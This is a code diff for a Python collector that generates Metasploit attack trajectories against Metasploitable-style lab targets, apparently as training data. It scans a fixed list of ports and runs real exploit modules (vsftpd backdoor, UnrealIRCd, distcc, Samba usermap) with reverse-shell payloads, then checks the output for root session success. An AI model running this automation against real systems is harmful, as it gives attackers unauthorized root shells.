@@ -13,8 +13,16 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 
-DATASET_VERSION = "msf_tool_v2_high_quality_balanced"
+DATASET_VERSION = "msf_tool_v3_verified_modules"
 COLLECTOR_NAME = "collect_msf_batch_trajectories.py"
+
+# Fixed ports for Metasploitable-style targets.
+# Important: default nmap scan may miss 3632, so we explicitly include it.
+PENTEST_PORTS = (
+    "21,22,23,25,53,80,111,139,445,512,513,514,"
+    "1099,1524,2049,2121,3306,3632,5432,5900,"
+    "6000,6200,6667,8009,8180"
+)
 
 EXPLOITS = [
     "exploit_bindshell",
@@ -36,49 +44,50 @@ MSF_MODULES = {
         "module": "exploit/unix/ftp/vsftpd_234_backdoor",
         "rport": 21,
         "payload": None,
+        "lport": None,
         "requires_lhost": False,
         "success_patterns": [
-            "Command shell session",
+            "found shell",
+            "command shell session .* opened",
             "session .* opened",
             "uid=0",
-            "uid=0(root)",
-            "root",
+            "uid=0\\(root\\)",
         ],
     },
     "exploit_unrealircd": {
         "module": "exploit/unix/irc/unreal_ircd_3281_backdoor",
         "rport": 6667,
-        "payload": "cmd/unix/reverse_netcat",
+        "payload": "cmd/unix/reverse",
+        "lport": 4445,
         "requires_lhost": True,
         "success_patterns": [
-            "Command shell session",
+            "command shell session .* opened",
             "session .* opened",
-            "uid=",
-            "uid=0",
+            "session .* created in the background",
         ],
     },
     "exploit_distccd": {
         "module": "exploit/unix/misc/distcc_exec",
         "rport": 3632,
-        "payload": "cmd/unix/reverse_netcat",
+        "payload": "cmd/unix/reverse",
+        "lport": 4446,
         "requires_lhost": True,
         "success_patterns": [
-            "Command shell session",
+            "command shell session .* opened",
             "session .* opened",
-            "uid=",
-            "uid=0",
+            "session .* created in the background",
         ],
     },
     "exploit_samba": {
         "module": "exploit/multi/samba/usermap_script",
         "rport": 139,
         "payload": "cmd/unix/reverse_netcat",
+        "lport": 4444,
         "requires_lhost": True,
         "success_patterns": [
-            "Command shell session",
+            "command shell session .* opened",
             "session .* opened",
-            "uid=",
-            "uid=0",
+            "session .* created in the background",
         ],
     },
 }
@@ -123,6 +132,7 @@ def empty_state():
         "has_samba": False,
         "has_tomcat": False,
         "has_vsftpd_234": False,
+        "has_vsftpd_backdoor_6200": False,
         "has_unrealircd": False,
         "has_distccd": False,
         "has_shell": False,
@@ -167,11 +177,11 @@ def run_command(cmd, timeout=120, input_text=None):
 
 def run_nmap(target: str, service_scan: bool):
     if service_scan:
-        cmd = ["nmap", "-Pn", "-sV", "-sC", target]
-        timeout = 180
+        cmd = ["nmap", "-Pn", "-sV", "-sC", "-p", PENTEST_PORTS, target]
+        timeout = 240
     else:
-        cmd = ["nmap", "-Pn", target]
-        timeout = 90
+        cmd = ["nmap", "-Pn", "-p", PENTEST_PORTS, target]
+        timeout = 120
 
     return run_command(cmd, timeout=timeout)
 
@@ -232,6 +242,7 @@ def update_state_from_nmap(state: dict, open_ports: list[int], service_map: dict
     state["has_mysql"] = "mysql" in services or 3306 in open_ports
     state["has_postgresql"] = "postgresql" in services or 5432 in open_ports
     state["has_bindshell_1524"] = 1524 in open_ports
+    state["has_vsftpd_backdoor_6200"] = 6200 in open_ports
 
     state["has_samba"] = (
         139 in open_ports
@@ -300,11 +311,16 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
     if config["requires_lhost"]:
         rc_lines.append(f"set LHOST {lhost}")
 
+    if config.get("lport"):
+        rc_lines.append(f"set LPORT {config['lport']}")
+
+    # Do not use sessions -C here.
+    # It can cause quote parsing issues in batch mode for cmd/unix shells.
+    # Session opened is enough for success verification in this collector.
     rc_lines.extend([
         "run -z",
         "sleep 8",
-        "sessions -C \"whoami; id; uname -a\"",
-        "sleep 2",
+        "sessions -l",
         "sessions -K",
         "exit -y",
     ])
@@ -317,7 +333,7 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
 
     result = run_command(
         ["msfconsole", "-q", "-r", rc_path],
-        timeout=180,
+        timeout=220,
     )
 
     combined = result["stdout"] + "\n" + result["stderr"]
@@ -328,15 +344,22 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
 
     success = False
     for pattern in config["success_patterns"]:
-        if re.search(pattern.lower(), combined_lower):
+        if re.search(pattern, combined_lower):
             success = True
             break
 
-    if "no session was created" in combined_lower:
-        success = False
+    negative_patterns = [
+        "no session was created",
+        "a payload has not been selected",
+        "the value specified for payload is not valid",
+        "unknown datastore option: lhost",
+        "exploit failed",
+    ]
 
-    if "please specify valid session" in combined_lower:
-        success = False
+    for pattern in negative_patterns:
+        if pattern in combined_lower:
+            success = False
+            break
 
     return {
         "success": success,
@@ -345,6 +368,7 @@ def run_msf_exploit(action: str, target: str, lhost: str, raw_dir: Path, run_id:
         "rport": config["rport"],
         "payload": config["payload"],
         "lhost": lhost if config["requires_lhost"] else None,
+        "lport": config.get("lport"),
         "raw_output_path": str(raw_path),
         "returncode": result["returncode"],
     }
@@ -374,10 +398,13 @@ def available_exploits(state: dict):
 def choose_stable_exploit(state: dict):
     """
     Stable exploit for good/recover paths.
-    This is intentionally reliable so that the dataset contains successful trajectories.
+    Order reflects verified reliability in this lab.
     """
     if state["has_bindshell_1524"]:
         return "exploit_bindshell"
+
+    if state["has_vsftpd_234"] or state["has_ftp"]:
+        return "exploit_vsftpd"
 
     if state["has_samba"]:
         return "exploit_samba"
@@ -388,17 +415,13 @@ def choose_stable_exploit(state: dict):
     if state["has_distccd"]:
         return "exploit_distccd"
 
-    if state["has_vsftpd_234"] or state["has_ftp"]:
-        return "exploit_vsftpd"
-
     return random.choice(EXPLOITS)
 
 
 def choose_random_available_exploit(state: dict):
     """
     Balanced random exploit selection.
-    Random/noisy/fail paths prefer non-bindshell actions to avoid overfitting the dataset
-    to the easy 1524 bind shell path.
+    Prefer non-bindshell actions so the dataset does not collapse into the easy 1524 path.
     """
     candidates = available_exploits(state)
 
